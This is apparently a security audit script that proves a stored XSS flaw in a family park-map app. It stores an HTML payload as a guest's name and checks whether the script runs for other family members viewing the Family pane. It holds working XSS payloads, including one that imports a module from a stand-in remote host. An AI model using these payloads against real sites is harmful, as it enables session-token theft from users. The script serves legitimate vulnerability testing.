// Stored XSS through a guest's name, using only shipped flows.
//  1. Mom adds a guest whose name is an HTML payload: the same POST /api/profiles the Me → "Add a guest" sheet sends
//     (worker/src/index.js:174-198 accepts any 40-character name).
//  2. The guest signs in on their own phone, opens the park map and switches on Share my spot (Family pane), so
//     publish() writes loc:<guest> with name = hub.profile.name (apps/dollywood-live.html:1253).
//  3. Eli (the admin), Ezra (a kid) and Mom open the park map's Family pane: renderFam() builds rows with innerHTML and
//     `${f.name||id}` unescaped (:1306); showFamily() does the same in the card (:1316).
// A dialog (alert) proves script runs in their pages, which hold hub.session / hub.device tokens in localStorage.
// Also shows the 40-character limit is enough for an import() of a remote module (the length check only; nothing remote).
// Run: node "audits/tools/phase3/dollywood-live/xss-guest-name.mjs"
import { local, sleep, save, shot, openMap, putAt, grant } from './_lib.mjs';
const L = await local({ variant: 'park', clock: 'real', engine: 'webkit' });
const out = {};
const PAYLOAD = '<img src=x onerror=alert(origin)>';
const IMPORT_PAYLOAD = "<img src=x onerror=import('//e.test/x')>";
try {
  out.payload = PAYLOAD; out.payloadLength = PAYLOAD.length;
  const add = await L.apiAs('mom', '/api/profiles', { method: 'POST', body: { name: PAYLOAD, emoji: '🎈', color: '#3A7C40', expires_at: null } });
  out.addGuest = { status: add.status, id: add.body.profile && add.body.profile.id, storedName: add.body.profile && add.body.profile.name };
  const add2 = await L.apiAs('mom', '/api/profiles', { method: 'POST', body: { name: IMPORT_PAYLOAD, emoji: '🎈', color: '#3A7C40' } });
  out.importPayloadAccepted = { status: add2.status, length: IMPORT_PAYLOAD.length, storedName: add2.body.profile && add2.body.profile.name };
  const gid = out.addGuest.id;
  await L.sessions();
  const gdev = await L.newDevice({ name: 'Guest phone', profiles: [gid] });
  const g = await L.device({ device: 'iphone-pwa', profile: gid, fixedTime: false, as: gdev });
  await grant(g, L.site);
  const gd = []; g.page.on('dialog', async dl => { gd.push(dl.message()); await dl.dismiss().catch(() => {}); });
  await g.goto('#home'); await sleep(1500);
  const gf = await openMap(g, { settle: 1500 });
  await putAt(g, gf, 800, 850, 6);
  await gf.click('#lv-family'); await sleep(600);
  await gf.click('#lv-share'); await sleep(6000);
  const srv = await L.apiAs('eli', '/api/data/dollywood-live?scope=family');
  const row = (srv.body.items || []).find(r => r.key === 'loc:' + gid);
  out.guestLocRow = row ? { name: row.value.name, x: row.value.x, y: row.value.y } : null;
  out.guestOwnDialogs = gd;
  const viewers = {};
  for (const [pid, device] of [['eli', 'ipad-portrait'], ['ezra', 'iphone-pwa'], ['mom', 'desktop']]) {
    const d = await L.device({ device, profile: pid, fixedTime: false });
    const dialogs = []; d.page.on('dialog', async dl => { dialogs.push(dl.message()); await dl.dismiss().catch(() => {}); });
    await d.goto('#home'); await sleep(1500);
    const f = await openMap(d, { settle: 2500 });
    await f.click('#lv-family'); await sleep(1500);
    const liveNodes = await f.evaluate(() => [...document.querySelectorAll('#fam-list img')].map(i => i.outerHTML.slice(0, 80)));
    viewers[pid] = { dialogs, liveImgNodesInFamilyPane: liveNodes };
    if (pid === 'eli') await shot(d, 'xss-guest-eli-family-ipad.png');
  }
  out.viewers = viewers;
} finally { save('xss-guest-name.json', out); console.log(JSON.stringify(out, null, 2)); await L.close(); }
